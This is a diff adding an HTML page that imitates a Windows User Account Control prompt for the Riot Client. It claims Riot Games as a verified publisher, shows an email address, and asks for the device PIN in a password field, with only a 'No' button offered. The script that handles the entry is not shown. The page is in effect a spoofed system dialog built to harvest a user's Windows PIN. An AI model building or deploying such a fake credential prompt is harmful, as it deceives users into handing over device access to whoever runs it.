@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <!-- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">
+    <link href="./styles.css" rel="stylesheet">
+    <title>User Account Control</title>
+  </head>
+  <body>
+<div class="container">
+      <div class="top">
+          	<p class="title">User Account Control</p>
+			<p class="prompt">Do you want to allow this app to make changes to your device?</p>
+      </div>
+        <div class="middle">
+            <div class="app-wrapper">
+                <img class="logo" src="./images/riot-games.png">
+                <div class="logo-text">Riot Client</div>
+            </div>
+            <div class="text-wrapper">
+                <div class="publisher-origin">
+                    Verified publisher: Riot Games, Inc. <br>
+                    File origin: Hard drive on this computer
+                </div>
+                <div class="details">
+                    Show more details
+                </div>
+                <div class="continue">
+                    To continue, enter an admin username and password.
+                </div>
+            </div>
+            <div class="pin-wrapper">
+                <img class="pin-logo" src="images/pin.png">
+                <div class="pin-text-wrapper">
+                    <div class="pin-text">PIN</div>
+                    <div class="email-address">sursara@hotmail.com</div>
+                    <input id="pin-input" class="pin-input" type="password"  placeholder="PIN"></input>
+                    <div class="forgot-pin">I forgot my PIN</div>
+                </div>
+            </div>
+        </div>
+        <div class="bottom">
+            <button id="no-button" class="button">No</button>
+        </div>
+</div>
+    <script src="./app.js"></script>
+  </body>
+</html>
